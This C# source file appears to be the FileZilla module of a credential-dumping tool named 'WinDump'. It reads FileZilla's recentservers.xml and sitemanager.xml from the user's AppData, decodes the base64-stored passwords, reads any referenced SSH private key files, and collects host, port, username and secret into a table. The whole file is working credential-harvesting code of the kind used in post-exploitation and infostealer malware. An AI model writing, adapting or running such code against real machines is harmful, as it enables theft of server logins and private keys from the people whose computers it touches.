using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Text;
using System.Xml;

namespace WinDump
{
    internal class FileZilla
    {
        internal static DataTable GetFileZilla()
        {
            var dt = new DataTable();
            dt.Columns.Add("Name");
            dt.Columns.Add("Proto");
            dt.Columns.Add("Host");
            dt.Columns.Add("Port");
            dt.Columns.Add("Username");
            dt.Columns.Add("Pwd/Key");
            var data = Files.DumpFile(@"%APPDATA%\FileZilla\recentservers.xml", out bool ok);
            if (ok)
            {
                try
                {

                    Parse(dt, data, "/FileZilla3/RecentServers");
                }
                catch { }
            }
            data = Files.DumpFile(@"%APPDATA%\FileZilla\sitemanager.xml", out ok);
            if (ok)
            {
                try
                {

                    Parse(dt, data, "/FileZilla3/Servers");
                }
                catch { }
            }
            return dt;
        }
        internal static void Parse(DataTable dt, string data, string xpath)
        {
            var xmlDoc = new XmlDocument();
            xmlDoc.LoadXml(data);
            foreach (XmlNode node in xmlDoc.SelectNodes(xpath))
            {
                string host = string.Empty;
                string port = string.Empty;
                string username = string.Empty;
                string pwdkey = string.Empty;
                string proto = string.Empty;
                string name = string.Empty;
                foreach (XmlNode serverNode in node.ChildNodes)
                {
                    foreach (XmlNode itemNode in serverNode.ChildNodes)
                    switch (itemNode.Name)
                    {
                        case "Name":
                            name = itemNode.InnerText;
                            break;
                        case "Host":
                            host = itemNode.InnerText;
                            break;
                        case "Port":
                            port = itemNode.InnerText;
                            break;
                        case "User":
                            username = itemNode.InnerText;
                            break;
                        case "Pass":
                            pwdkey = itemNode.InnerText;
                            if (itemNode.Attributes.Count != 0)
                            {
                                pwdkey = Encoding.UTF8.GetString(Convert.FromBase64String(pwdkey));
                            }
                            break;
                        case "Keyfile":
                            var keypath = itemNode.InnerText;
                            if (File.Exists(keypath))
                            {
                                pwdkey = File.ReadAllText(keypath);
                            }
                            break;
                        case "Protocol":
                            switch (itemNode.InnerText)
                            {
                                case "0":
                                    proto = "ftp";
                                    break;
                                case "1":
                                    proto = "sftp";
                                    break;
                                default:
                                    proto = "unknow";
                                    break;
                            }
                            break;
                    }
                    dt.Rows.Add(name, proto, host, port, username, pwdkey);
                }
                
            }

        }
    }
}
